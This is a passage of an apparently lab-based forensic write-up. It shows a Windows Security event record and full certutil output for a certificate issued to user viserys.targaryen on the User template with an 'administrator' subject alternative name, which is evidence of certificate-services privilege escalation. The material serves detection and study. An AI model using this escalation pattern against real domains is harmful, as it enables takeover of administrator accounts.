  <Level>0</Level> 
  <Task>12805</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-07-28T18:19:59.9307870Z" /> 
  <EventRecordID>31471</EventRecordID> 
  <Correlation ActivityID="{aba101cc-ff1e-0001-3703-a1ab1effdb01}" /> 
  <Execution ProcessID="668" ThreadID="716" /> 
  <Channel>Security</Channel> 
  <Computer>braavos.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="RequestId">20</Data> 
  <Data Name="Requester">ESSOS\viserys.targaryen</Data> 
  <Data Name="Attributes">CertificateTemplate:User</Data> 
  <Data Name="Disposition">3</Data> 
  <Data Name="SubjectKeyIdentifier">ce 95 ab 7b 05 17 75 4a 9d e3 6a 4a 18 ad fa 03 a1 26 c8 7d</Data> 
  <Data Name="Subject">CN=viserys.targaryen, CN=Users, DC=essos, DC=local</Data> 
  <Data Name="SubjectAlternativeName">Other Name: Principal Name=administrator</Data> 
  <Data Name="CertificateTemplate">User</Data> 
  <Data Name="SerialNumber">20000000149241a5d99e294fd6000000000014</Data> 
  <Data Name="AuthenticationService">NTLM</Data> 
  <Data Name="AuthenticationLevel">Privacy</Data> 
  <Data Name="DCOMorRPC">RPC</Data> 
  </EventData>
  </Event>
```

### certutil output
<details>
<summary>Output of certuril tool</summary>

```
certutil.exe -v -view -restrict "RequestID=20" -gmt -out Request.RequestID,Request.RawRequest,Request.RawArchivedKey,Request.KeyRecoveryHashes,Request.RawOldCertificate,Request.RequestAttributes,Request.RequestType,Request.RequestFlags,Request.StatusCode,Request.Disposition,Request.DispositionMessage,Request.SubmittedWhen,Request.ResolvedWhen,Request.RevokedWhen,Request.RevokedEffectiveWhen,Request.RevokedReason,Request.RequesterName,Request.CallerName,Request.SignerPolicies,Request.SignerApplicationPolicies,Request.Officer,Request.DistinguishedName,Request.RawName,Request.Country,Request.Organization,Request.OrgUnit,Request.CommonName,Request.Locality,Request.State,Request.Title,Request.GivenName,Request.Initials,Request.SurName,Request.DomainComponent,Request.EMail,Request.StreetAddress,Request.UnstructuredName,Request.UnstructuredAddress,Request.DeviceSerialNumber,Request.AttestationChallenge,Request.EndorsementKeyHash,Request.EndorsementCertificateHash,Request.RawPrecertificate,RequestID,RawCertificate,CertificateHash,CertificateTemplate,EnrollmentFlags,GeneralFlags,PrivatekeyFlags,SerialNumber,IssuerNameID,NotBefore,NotAfter,SubjectKeyIdentifier,RawPublicKey,PublicKeyLength,PublicKeyAlgorithm,RawPublicKeyAlgorithmParameters,PublishExpiredCertInCRL,UPN,DistinguishedName,RawName,Country,Organization,OrgUnit,CommonName,Locality,State,Title,GivenName,Initials,SurName,DomainComponent,EMail,StreetAddress,UnstructuredName,UnstructuredAddress,DeviceSerialNumber
    
    Row 1:
      Request ID: 0x14 (20)
      Binary Request:
    -----BEGIN NEW CERTIFICATE REQUEST-----
    MIICYTCCAUkCAQAwHDEaMBgGA1UEAwwRVmlzZXJ5cy50YXJnYXJ5ZW4wggEiMA0G
    CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC0UQdkOppc+uKS8MVJuj2HCBzMxk3i
    tn732o+T/N3OiP3LIv5SEsXX0EBMt8UIKLkxm9GQrpChJAZ7sMkCZk0b1bnvYXWn
    8X5Z0EPPHPUiacEaXJvM5ANR2fVChD0mjJGmz7DW6fKjb8OfDmCresP5oqHaPOhm
    rugUeDkEDA2D/sCsadKuI/TA3Mas1+tlMZtzYmWzXNRzqDTnyMS5ft4LI/1kOsql
    iO3WW2JxYmLrkZVtlLmUVoq/x+tp8ZjLS7p3WvvINftAZ+dJCcB2pPVSq/q96PGS
    /XVeB2dqLkNPQRgagw+luZqDIorbeBIyy5gjQCSh+EQUdq0cpRlv4fDxAgMBAAGg
    ADANBgkqhkiG9w0BAQsFAAOCAQEAIw0t06gmCpbUdrHDvspciJpd4ECdhyMSdJD5
    OUpJ7wyb7kRmny+BHA2g0YfYML1HPSQInwsakag+Mqt7SRdYCNI4RS3/UmX9YtRB
    lcb3dG42lzc8P0F8JSX9fwgNepvPVkwTDFaNr97YrdzTrbnShNIAa9os3UQC3cOo
    vy26vyZX12yhVtH0JcNvz6BzIwQ4fy7erDBRfZl0rB2OGJU6MAOXb9wTxkfqd1pr
    bNTV7eunH/h1S+WrMTbMZ5FHn6VFSgHCJmvTeeo/dastYOF+R3ekDAq2MPtOEVM1
    qKymkz6khf5UDOzDBW17ioXRdEPznjZQi/l36e16KOLoKGVC6Q==
    -----END NEW CERTIFICATE REQUEST-----
    
    PKCS10 Certificate Request:
    Version: 1
    Subject:
        CN=Viserys.targaryen
      Name Hash(sha1): 6a9f65aad7b9c0b669f63368987c5922e851c9ef
      Name Hash(md5): 4f44096017c4181d7daaade25b2d1b7b
    
    Public Key Algorithm:
        Algorithm ObjectId: 1.2.840.113549.1.1.1 RSA (RSA_SIGN)
        Algorithm Parameters:
        05 00
    Public Key Length: 2048 bits
    Public Key: UnusedBits = 0
        0000  30 82 01 0a 02 82 01 01  00 b4 51 07 64 3a 9a 5c
        0010  fa e2 92 f0 c5 49 ba 3d  87 08 1c cc c6 4d e2 b6
        0020  7e f7 da 8f 93 fc dd ce  88 fd cb 22 fe 52 12 c5
        0030  d7 d0 40 4c b7 c5 08 28  b9 31 9b d1 90 ae 90 a1
        0040  24 06 7b b0 c9 02 66 4d  1b d5 b9 ef 61 75 a7 f1
        0050  7e 59 d0 43 cf 1c f5 22  69 c1 1a 5c 9b cc e4 03
        0060  51 d9 f5 42 84 3d 26 8c  91 a6 cf b0 d6 e9 f2 a3
        0070  6f c3 9f 0e 60 ab 7a c3  f9 a2 a1 da 3c e8 66 ae
        0080  e8 14 78 39 04 0c 0d 83  fe c0 ac 69 d2 ae 23 f4
        0090  c0 dc c6 ac d7 eb 65 31  9b 73 62 65 b3 5c d4 73
        00a0  a8 34 e7 c8 c4 b9 7e de  0b 23 fd 64 3a ca a5 88
        00b0  ed d6 5b 62 71 62 62 eb  91 95 6d 94 b9 94 56 8a
        00c0  bf c7 eb 69 f1 98 cb 4b  ba 77 5a fb c8 35 fb 40
        00d0  67 e7 49 09 c0 76 a4 f5  52 ab fa bd e8 f1 92 fd
        00e0  75 5e 07 67 6a 2e 43 4f  41 18 1a 83 0f a5 b9 9a
        00f0  83 22 8a db 78 12 32 cb  98 23 40 24 a1 f8 44 14
        0100  76 ad 1c a5 19 6f e1 f0  f1 02 03 01 00 01
    Request Attributes: 0
      0 attributes:
    Signature Algorithm:
        Algorithm ObjectId: 1.2.840.113549.1.1.11 sha256RSA
        Algorithm Parameters:
        05 00
    Signature: UnusedBits=0
        0000  e9 42 65 28 e8 e2 28 7a  ed e9 77 f9 8b 50 36 9e
        0010  f3 43 74 d1 85 8a 7b 6d  05 c3 ec 0c 54 fe 85 a4
        0020  3e 93 a6 ac a8 35 53 11  4e fb 30 b6 0a 0c a4 77
        0030  47 7e e1 60 2d ab 75 3f  ea 79 d3 6b 26 c2 01 4a
        0040  45 a5 9f 47 91 67 cc 36  31 ab e5 4b 75 f8 1f a7
        0050  eb ed d5 d4 6c 6b 5a 77  ea 47 c6 13 dc 6f 97 03
        0060  30 3a 95 18 8e 1d ac 74  99 7d 51 30 ac de 2e 7f
        0070  38 04 23 73 a0 cf 6f c3  25 f4 d1 56 a1 6c d7 57
        0080  26 bf ba 2d bf a8 c3 dd  02 44 dd 2c da 6b 00 d2
        0090  84 d2 b9 ad d3 dc ad d8  de af 8d 56 0c 13 4c 56
        00a0  cf 9b 7a 0d 08 7f fd 25  25 7c 41 3f 3c 37 97 36
        00b0  6e 74 f7 c6 95 41 d4 62  fd 65 52 ff 2d 45 38 d2
        00c0  08 58 17 49 7b ab 32 3e  a8 91 1a 0b 9f 08 24 3d
        00d0  47 bd 30 d8 87 d1 a0 0d  1c 81 2f 9f 66 44 ee 9b
        00e0  0c ef 49 4a 39 f9 90 74  12 23 87 9d 40 e0 5d 9a
        00f0  88 5c ca be c3 b1 76 d4  96 0a 26 a8 d3 2d 0d 23
    Signature matches Public Key
    Key Id Hash(rfc-sha1): ce95ab7b0517754a9de36a4a18adfa03a126c87d
    Key Id Hash(sha1): 083eea3ad338fc719c22bd89ddc4ac4ce8e37833
    Key Id Hash(bcrypt-sha1): 8f2c34bf594fcd626193c213da5e67710e088e51
    Key Id Hash(bcrypt-sha256): 09f50c5d8718be17f007ebe86607d996521170976057ddaaff2f34c20fdde05c
    
      Archived Key: EMPTY
      Key Recovery Agent Hashes: EMPTY
      Old Certificate: EMPTY
      Request Attributes: "CertificateTemplate:User"
    0000    43 00 65 00 72 00 74 00  69 00 66 00 69 00 63 00   C.e.r.t.i.f.i.c.
    0010    61 00 74 00 65 00 54 00  65 00 6d 00 70 00 6c 00   a.t.e.T.e.m.p.l.
    0020    61 00 74 00 65 00 3a 00  55 00 73 00 65 00 72 00   a.t.e.:.U.s.e.r.
    
      Request Type: 0x100 (256) -- PKCS10
      Request Flags: 0x4 -- Force UTF-8
      Request Status Code: 0x0 (WIN32: 0) -- The operation completed successfully.
      Request Disposition: 0x14 (20) -- Issued
      Request Disposition Message: "Issued  0x80094004, The Enrollee (CN=viserys.targaryen,CN=Users,DC=essos,DC=local) has no E-Mail name registered in the Active Directory.  The E-Mail name will not be included in the certificate.
    "
    0000    49 00 73 00 73 00 75 00  65 00 64 00 20 00 20 00   I.s.s.u.e.d. . .
    0010    30 00 78 00 38 00 30 00  30 00 39 00 34 00 30 00   0.x.8.0.0.9.4.0.
    0020    30 00 34 00 2c 00 20 00  54 00 68 00 65 00 20 00   0.4.,. .T.h.e. .
    0030    45 00 6e 00 72 00 6f 00  6c 00 6c 00 65 00 65 00   E.n.r.o.l.l.e.e.
    0040    20 00 28 00 43 00 4e 00  3d 00 76 00 69 00 73 00    .(.C.N.=.v.i.s.
    0050    65 00 72 00 79 00 73 00  2e 00 74 00 61 00 72 00   e.r.y.s...t.a.r.
    0060    67 00 61 00 72 00 79 00  65 00 6e 00 2c 00 43 00   g.a.r.y.e.n.,.C.
    0070    4e 00 3d 00 55 00 73 00  65 00 72 00 73 00 2c 00   N.=.U.s.e.r.s.,.
    0080    44 00 43 00 3d 00 65 00  73 00 73 00 6f 00 73 00   D.C.=.e.s.s.o.s.
    0090    2c 00 44 00 43 00 3d 00  6c 00 6f 00 63 00 61 00   ,.D.C.=.l.o.c.a.
    00a0    6c 00 29 00 20 00 68 00  61 00 73 00 20 00 6e 00   l.). .h.a.s. .n.
    00b0    6f 00 20 00 45 00 2d 00  4d 00 61 00 69 00 6c 00   o. .E.-.M.a.i.l.
    00c0    20 00 6e 00 61 00 6d 00  65 00 20 00 72 00 65 00    .n.a.m.e. .r.e.
    00d0    67 00 69 00 73 00 74 00  65 00 72 00 65 00 64 00   g.i.s.t.e.r.e.d.
    00e0    20 00 69 00 6e 00 20 00  74 00 68 00 65 00 20 00    .i.n. .t.h.e. .
    00f0    41 00 63 00 74 00 69 00  76 00 65 00 20 00 44 00   A.c.t.i.v.e. .D.
    0100    69 00 72 00 65 00 63 00  74 00 6f 00 72 00 79 00   i.r.e.c.t.o.r.y.
    0110    2e 00 20 00 20 00 54 00  68 00 65 00 20 00 45 00   .. . .T.h.e. .E.
    0120    2d 00 4d 00 61 00 69 00  6c 00 20 00 6e 00 61 00   -.M.a.i.l. .n.a.
    0130    6d 00 65 00 20 00 77 00  69 00 6c 00 6c 00 20 00   m.e. .w.i.l.l. .
    0140    6e 00 6f 00 74 00 20 00  62 00 65 00 20 00 69 00   n.o.t. .b.e. .i.
    0150    6e 00 63 00 6c 00 75 00  64 00 65 00 64 00 20 00   n.c.l.u.d.e.d. .
    0160    69 00 6e 00 20 00 74 00  68 00 65 00 20 00 63 00   i.n. .t.h.e. .c.
    0170    65 00 72 00 74 00 69 00  66 00 69 00 63 00 61 00   e.r.t.i.f.i.c.a.
    0180    74 00 65 00 2e 00 0d 00  0a 00                     t.e.......
    
      Request Submission Date: 7/28/2025 6:19 PM GMT
      Request Resolution Date: 7/28/2025 6:19 PM GMT
      Revocation Date: EMPTY
      Effective Revocation Date: EMPTY
      Revocation Reason: EMPTY
      Requester Name: "ESSOS\viserys.targaryen"
    0000    45 00 53 00 53 00 4f 00  53 00 5c 00 76 00 69 00   E.S.S.O.S.\.v.i.
    0010    73 00 65 00 72 00 79 00  73 00 2e 00 74 00 61 00   s.e.r.y.s...t.a.
    0020    72 00 67 00 61 00 72 00  79 00 65 00 6e 00         r.g.a.r.y.e.n.
    
      Caller Name: "ESSOS\viserys.targaryen"
    0000    45 00 53 00 53 00 4f 00  53 00 5c 00 76 00 69 00   E.S.S.O.S.\.v.i.
    0010    73 00 65 00 72 00 79 00  73 00 2e 00 74 00 61 00   s.e.r.y.s...t.a.
    0020    72 00 67 00 61 00 72 00  79 00 65 00 6e 00         r.g.a.r.y.e.n.
    
      Signer Policies: EMPTY
      Signer Application Policies: EMPTY
      Officer: EMPTY
      Request Distinguished Name: "CN=Viserys.targaryen"
    0000    43 00 4e 00 3d 00 56 00  69 00 73 00 65 00 72 00   C.N.=.V.i.s.e.r.
    0010    79 00 73 00 2e 00 74 00  61 00 72 00 67 00 61 00   y.s...t.a.r.g.a.
    0020    72 00 79 00 65 00 6e 00                            r.y.e.n.
    
      Request Binary Name:
    0000    30 1c 31 1a 30 18 06 03  55 04 03 0c 11 56 69 73   0.1.0...U....Vis
    0010    65 72 79 73 2e 74 61 72  67 61 72 79 65 6e         erys.targaryen
    
      Request Country/Region: EMPTY
      Request Organization: EMPTY
      Request Organization Unit: EMPTY
      Request Common Name: "Viserys.targaryen"
    0000    56 00 69 00 73 00 65 00  72 00 79 00 73 00 2e 00   V.i.s.e.r.y.s...
    0010    74 00 61 00 72 00 67 00  61 00 72 00 79 00 65 00   t.a.r.g.a.r.y.e.
    0020    6e 00                                              n.
    
      Request City: EMPTY
      Request State: EMPTY
      Request Title: EMPTY
      Request First Name: EMPTY
      Request Initials: EMPTY
      Request Last Name: EMPTY
      Request Domain Component: EMPTY
      Request Email Address: EMPTY
      Request Street Address: EMPTY
      Request Unstructured Name: EMPTY
      Request Unstructured Address: EMPTY
      Request Device Serial Number: EMPTY
      Attestation Challenge: EMPTY
      Endorsement Key Hash: EMPTY
      Endorsement Certificate Hash: EMPTY
      Binary Precertificate: EMPTY
      Issued Request ID: 0x14 (20)
      Binary Certificate:
    -----BEGIN CERTIFICATE-----
    MIIGCDCCBPCgAwIBAgITIAAAABSSQaXZnilP1gAAAAAAFDANBgkqhkiG9w0BAQsF
    ADBBMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFTATBgoJkiaJk/IsZAEZFgVlc3Nv
    czERMA8GA1UEAxMIRVNTT1MtQ0EwHhcNMjUwNzI4MTgwOTU5WhcNMjYwNzI4MTgw
    OTU5WjBaMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFTATBgoJkiaJk/IsZAEZFgVl
    c3NvczEOMAwGA1UEAxMFVXNlcnMxGjAYBgNVBAMTEXZpc2VyeXMudGFyZ2FyeWVu
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtFEHZDqaXPrikvDFSbo9
    hwgczMZN4rZ+99qPk/zdzoj9yyL+UhLF19BATLfFCCi5MZvRkK6QoSQGe7DJAmZN
    G9W572F1p/F+WdBDzxz1ImnBGlybzOQDUdn1QoQ9JoyRps+w1unyo2/Dnw5gq3rD
    +aKh2jzoZq7oFHg5BAwNg/7ArGnSriP0wNzGrNfrZTGbc2Jls1zUc6g058jEuX7e
    CyP9ZDrKpYjt1lticWJi65GVbZS5lFaKv8frafGYy0u6d1r7yDX7QGfnSQnAdqT1
    Uqv6vejxkv11Xgdnai5DT0EYGoMPpbmagyKK23gSMsuYI0AkofhEFHatHKUZb+Hw
    8QIDAQABo4IC3jCCAtowHQYDVR0OBBYEFM6Vq3sFF3VKneNqShit+gOhJsh9MB8G
    A1UdIwQYMBaAFH1Oxx0zPzrvGpAOj09wpx5kq5TxMIHGBgNVHR8Egb4wgbswgbig
    gbWggbKGga9sZGFwOi8vL0NOPUVTU09TLUNBLENOPWJyYWF2b3MsQ049Q0RQLENO
    PVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3Vy
    YXRpb24sREM9ZXNzb3MsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz
    dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG6BggrBgEF
    BQcBAQSBrTCBqjCBpwYIKwYBBQUHMAKGgZpsZGFwOi8vL0NOPUVTU09TLUNBLENO
    PUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
    b25maWd1cmF0aW9uLERDPWVzc29zLERDPWxvY2FsP2NBQ2VydGlmaWNhdGU/YmFz
    ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MBcGCSsGAQQBgjcU
    AgQKHggAVQBzAGUAcjAOBgNVHQ8BAf8EBAMCBaAwKQYDVR0lBCIwIAYKKwYBBAGC
    NwoDBAYIKwYBBQUHAwQGCCsGAQUFBwMCMCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQC
    A6APDA1hZG1pbmlzdHJhdG9yME4GCSsGAQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkC
    AaAvBC1TLTEtNS0yMS02NjYxOTk2ODItMTQxMTM0MjE0Ny0yOTM4NzE3ODU1LTEx
    MTQwRAYJKoZIhvcNAQkPBDcwNTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQC
    AgCAMAcGBSsOAwIHMAoGCCqGSIb3DQMHMA0GCSqGSIb3DQEBCwUAA4IBAQCAR7Ig
    EFFpsePwC2Wicf7L1v6xlDz1F9i6wjGEhrXtYeFP/EVtjKBbAJjyzPWX9eb2PJ4g
    670anhQtRJ5Zd/+947rAk1IZPWA9WoPBAIgLKSX+/zLNpskyZ74b7gFReZyZdogs
    5Vh1HsgMyQCdWsD/Vn0A3/ipoBXKFZpy7dqYLPzb2H+/RDsMYYNjU+V0K0dnI+pa
    lsEjmplO/Vq0uN6iXZHWgkcUkQv+g5HS9rrgdi7f+4gF4gk6ec2WENLE3rum/KCR
    kKzLBsj1EAxue3FaCk2glMAVXgNgxVcOBUgLboluBOQJ3gAprVbcN8fPkxCSK41f
    eiz5jpPeM1kfGk2X
    -----END CERTIFICATE-----
    
    X509 Certificate:
    Version: 3
    Serial Number: 20000000149241a5d99e294fd6000000000014
    Signature Algorithm:
        Algorithm ObjectId: 1.2.840.113549.1.1.11 sha256RSA
        Algorithm Parameters:
        05 00
    Issuer:
        CN=ESSOS-CA
        DC=essos
        DC=local
      Name Hash(sha1): c555fa55fe8e3e84d965d463e888a73d1877edbc
      Name Hash(md5): 26df41790381580445365a074ae47bac
    
     NotBefore: 7/28/2025 6:09 PM GMT
     NotAfter: 7/28/2026 6:09 PM GMT
    
    Subject:
        CN=viserys.targaryen
        CN=Users
        DC=essos
        DC=local
      Name Hash(sha1): 287fe907b001547b1a0eb20fcc13bd0a9ca56486
      Name Hash(md5): 9d400f9bd6f25c155946a8d8ec8d635f
    
    Public Key Algorithm:
        Algorithm ObjectId: 1.2.840.113549.1.1.1 RSA
        Algorithm Parameters:
        05 00
    Public Key Length: 2048 bits
    Public Key: UnusedBits = 0
        0000  30 82 01 0a 02 82 01 01  00 b4 51 07 64 3a 9a 5c
        0010  fa e2 92 f0 c5 49 ba 3d  87 08 1c cc c6 4d e2 b6
        0020  7e f7 da 8f 93 fc dd ce  88 fd cb 22 fe 52 12 c5
        0030  d7 d0 40 4c b7 c5 08 28  b9 31 9b d1 90 ae 90 a1
        0040  24 06 7b b0 c9 02 66 4d  1b d5 b9 ef 61 75 a7 f1
        0050  7e 59 d0 43 cf 1c f5 22  69 c1 1a 5c 9b cc e4 03
        0060  51 d9 f5 42 84 3d 26 8c  91 a6 cf b0 d6 e9 f2 a3
        0070  6f c3 9f 0e 60 ab 7a c3  f9 a2 a1 da 3c e8 66 ae
        0080  e8 14 78 39 04 0c 0d 83  fe c0 ac 69 d2 ae 23 f4
        0090  c0 dc c6 ac d7 eb 65 31  9b 73 62 65 b3 5c d4 73
        00a0  a8 34 e7 c8 c4 b9 7e de  0b 23 fd 64 3a ca a5 88
        00b0  ed d6 5b 62 71 62 62 eb  91 95 6d 94 b9 94 56 8a
        00c0  bf c7 eb 69 f1 98 cb 4b  ba 77 5a fb c8 35 fb 40
        00d0  67 e7 49 09 c0 76 a4 f5  52 ab fa bd e8 f1 92 fd
        00e0  75 5e 07 67 6a 2e 43 4f  41 18 1a 83 0f a5 b9 9a
        00f0  83 22 8a db 78 12 32 cb  98 23 40 24 a1 f8 44 14
        0100  76 ad 1c a5 19 6f e1 f0  f1 02 03 01 00 01
    Certificate Extensions: 10
        2.5.29.14: Flags = 0, Length = 16
        Subject Key Identifier
            ce95ab7b0517754a9de36a4a18adfa03a126c87d
    
        2.5.29.35: Flags = 0, Length = 18
        Authority Key Identifier
            KeyID=7d4ec71d333f3aef1a900e8f4f70a71e64ab94f1
    
        2.5.29.31: Flags = 0, Length = be
        CRL Distribution Points
            [1]CRL Distribution Point
                 Distribution Point Name:
                      Full Name:
                           URL=ldap:///CN=ESSOS-CA,CN=braavos,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local?certificateRevocationList?base?objectClass=cRLDistributionPoint (ldap:///CN=ESSOS-CA,CN=braavos,CN=CDP,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=essos,DC=local?certificateRevocationList?base?objectClass=cRLDistributionPoint)
    
        1.3.6.1.5.5.7.1.1: Flags = 0, Length = ad
        Authority Information Access
            [1]Authority Info Access
                 Access Method=Certification Authority Issuer (1.3.6.1.5.5.7.48.2)
                 Alternative Name:
                      URL=ldap:///CN=ESSOS-CA,CN=AIA,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local?cACertificate?base?objectClass=certificationAuthority (ldap:///CN=ESSOS-CA,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=essos,DC=local?cACertificate?base?objectClass=certificationAuthority)
    
        1.3.6.1.4.1.311.20.2: Flags = 0, Length = a
        Certificate Template Name (Certificate Type)
            User
    
        2.5.29.15: Flags = 1(Critical), Length = 4
        Key Usage
            Digital Signature, Key Encipherment (a0)
    
        2.5.29.37: Flags = 0, Length = 22
        Enhanced Key Usage
            Encrypting File System (1.3.6.1.4.1.311.10.3.4)
            Secure Email (1.3.6.1.5.5.7.3.4)
            Client Authentication (1.3.6.1.5.5.7.3.2)
    
        2.5.29.17: Flags = 0, Length = 21
        Subject Alternative Name
            Other Name:
                 Principal Name=administrator
    
        1.3.6.1.4.1.311.25.2: Flags = 0, Length = 41
    
        0000  30 3f a0 3d 06 0a 2b 06  01 04 01 82 37 19 02 01   0?.=..+.....7...
        0010  a0 2f 04 2d 53 2d 31 2d  35 2d 32 31 2d 36 36 36   ./.-S-1-5-21-666
        0020  31 39 39 36 38 32 2d 31  34 31 31 33 34 32 31 34   199682-141134214
        0030  37 2d 32 39 33 38 37 31  37 38 35 35 2d 31 31 31   7-2938717855-111
        0040  34                                                 4
    0000: 30 3f                                     ; SEQUENCE (3f Bytes)
    0002:    a0 3d                                  ; OPTIONAL[0] (3d Bytes)
    0004:       06 0a                               ; OBJECT_ID (a Bytes)
    0006:       |  2b 06 01 04 01 82 37 19  02 01
                |     ; 1.3.6.1.4.1.311.25.2.1
    0010:       a0 2f                               ; OPTIONAL[0] (2f Bytes)
    0012:          04 2d                            ; OCTET_STRING (2d Bytes)
    0014:             53 2d 31 2d 35 2d 32 31  2d 36 36 36 31 39 39 36  ; S-1-5-21-6661996
    0024:             38 32 2d 31 34 31 31 33  34 32 31 34 37 2d 32 39  ; 82-1411342147-29
    0034:             33 38 37 31 37 38 35 35  2d 31 31 31 34           ; 38717855-1114
    
        1.2.840.113549.1.9.15: Flags = 0, Length = 37
        SMIME Capabilities
            [1]SMIME Capability
                 Object ID=1.2.840.113549.3.2
                 Parameters=02 02 00 80
            [2]SMIME Capability
                 Object ID=1.2.840.113549.3.4
                 Parameters=02 02 00 80
            [3]SMIME Capability
                 Object ID=1.3.14.3.2.7
            [4]SMIME Capability
                 Object ID=1.2.840.113549.3.7
    
    Signature Algorithm:
        Algorithm ObjectId: 1.2.840.113549.1.1.11 sha256RSA
        Algorithm Parameters:
        05 00
    Signature: UnusedBits=0
        0000  97 4d 1a 1f 59 33 de 93  8e f9 2c 7a 5f 8d 2b 92
        0010  10 93 cf c7 37 dc 56 ad  29 00 de 09 e4 04 6e 89
        0020  6e 0b 48 05 0e 57 c5 60  03 5e 15 c0 94 a0 4d 0a
        0030  5a 71 7b 6e 0c 10 f5 c8  06 cb ac 90 91 a0 fc a6
        0040  bb de c4 d2 10 96 cd 79  3a 09 e2 05 88 fb df 2e
        0050  76 e0 ba f6 d2 91 83 fe  0b 91 14 47 82 d6 91 5d
        0060  a2 de b8 b4 5a fd 4e 99  9a 23 c1 96 5a ea 23 67
        0070  47 2b 74 e5 53 63 83 61  0c 3b 44 bf 7f d8 db fc
        0080  2c 98 da ed 72 9a 15 ca  15 a0 a9 f8 df 00 7d 56
        0090  ff c0 5a 9d 00 c9 0c c8  1e 75 58 e5 2c 88 76 99
        00a0  9c 79 51 01 ee 1b be 67  32 c9 a6 cd 32 ff fe 25
        00b0  29 0b 88 00 c1 83 5a 3d  60 3d 19 52 93 c0 ba e3
        00c0  bd ff 77 59 9e 44 2d 14  9e 1a bd eb 20 9e 3c f6
        00d0  e6 f5 97 f5 cc f2 98 00  5b a0 8c 6d 45 fc 4f e1
        00e0  61 ed b5 86 84 31 c2 ba  d8 17 f5 3c 94 b1 fe d6
        00f0  cb fe 71 a2 65 0b f0 e3  b1 69 51 10 20 b2 47 80
    Non-root Certificate
    Key Id Hash(rfc-sha1): ce95ab7b0517754a9de36a4a18adfa03a126c87d
    Key Id Hash(sha1): 083eea3ad338fc719c22bd89ddc4ac4ce8e37833
    Key Id Hash(bcrypt-sha1): 8f2c34bf594fcd626193c213da5e67710e088e51
    Key Id Hash(bcrypt-sha256): 09f50c5d8718be17f007ebe86607d996521170976057ddaaff2f34c20fdde05c
    Key Id Hash(md5): 9e7862737343ea9b788138e770f460a3
    Key Id Hash(sha256): 5483eeff44bc8ceb2c210917248fc5d78a1ca46d251047a8134baf6902434037
    Key Id Hash(pin-sha256): bvn7xWhY2C9k2YQge413UzqkKI/d6nFcull+fPjL9D0=
    Key Id Hash(pin-sha256-hex): 6ef9fbc56858d82f64d984207b8d77533aa4288fddea715cba597e7cf8cbf43d
    Cert Hash(md5): 3da16f2db1a6b4fe2faf56c58fe3dde5
    Cert Hash(sha1): 9dae1287fd1479e3e90340b66c626dcc9fb9d5fb
    Cert Hash(sha256): c7d2cfba7fe7cf659973f81dc7b14de409a170e0f8d489162e25130086ee4cb6
    Signature Hash: 24973ff8e6a8134ae5d07de1c41411682c7a3b4220150b000a9de1c46d2a5b76
    
      Certificate Hash: "9d ae 12 87 fd 14 79 e3 e9 03 40 b6 6c 62 6d cc 9f b9 d5 fb"
    0000    39 00 64 00 20 00 61 00  65 00 20 00 31 00 32 00   9.d. .a.e. .1.2.
    0010    20 00 38 00 37 00 20 00  66 00 64 00 20 00 31 00    .8.7. .f.d. .1.
    0020    34 00 20 00 37 00 39 00  20 00 65 00 33 00 20 00   4. .7.9. .e.3. .
    0030    65 00 39 00 20 00 30 00  33 00 20 00 34 00 30 00   e.9. .0.3. .4.0.
    0040    20 00 62 00 36 00 20 00  36 00 63 00 20 00 36 00    .b.6. .6.c. .6.
    0050    32 00 20 00 36 00 64 00  20 00 63 00 63 00 20 00   2. .6.d. .c.c. .
    0060    39 00 66 00 20 00 62 00  39 00 20 00 64 00 35 00   9.f. .b.9. .d.5.
    0070    20 00 66 00 62 00                                   .f.b.
    
      Certificate Template: "User"
    0000    55 00 73 00 65 00 72 00                            U.s.e.r.
    
      Template Enrollment Flags: 0x29 (41)
        CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS -- 1
          (CT_FLAG_PEND_ALL_REQUESTS -- 2)
          (CT_FLAG_PUBLISH_TO_KRA_CONTAINER -- 4)
        CT_FLAG_PUBLISH_TO_DS -- 8
          (CT_FLAG_AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE -- 10 (16))
        CT_FLAG_AUTO_ENROLLMENT -- 20 (32)
          (CT_FLAG_PREVIOUS_APPROVAL_VALIDATE_REENROLLMENT -- 40 (64))
          (CT_FLAG_DOMAIN_AUTHENTICATION_NOT_REQUIRED -- 80 (128))
          (CT_FLAG_USER_INTERACTION_REQUIRED -- 100 (256))
          (CT_FLAG_ADD_TEMPLATE_NAME -- 200 (512))
          (CT_FLAG_REMOVE_INVALID_CERTIFICATE_FROM_PERSONAL_STORE -- 400 (1024))
          (CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF -- 800 (2048))
          (CT_FLAG_ADD_OCSP_NOCHECK -- 1000 (4096))
          (CT_FLAG_ENABLE_KEY_REUSE_ON_NT_TOKEN_KEYSET_STORAGE_FULL -- 2000 (8192))
          (CT_FLAG_NOREVOCATIONINFOINISSUEDCERTS -- 4000 (16384))
          (CT_FLAG_INCLUDE_BASIC_CONSTRAINTS_FOR_EE_CERTS -- 8000 (32768))
          (CT_FLAG_ALLOW_PREVIOUS_APPROVAL_KEYBASEDRENEWAL_VALIDATE_REENROLLMENT -- 10000 (65536))
          (CT_FLAG_ISSUANCE_POLICIES_FROM_REQUEST -- 20000 (131072))
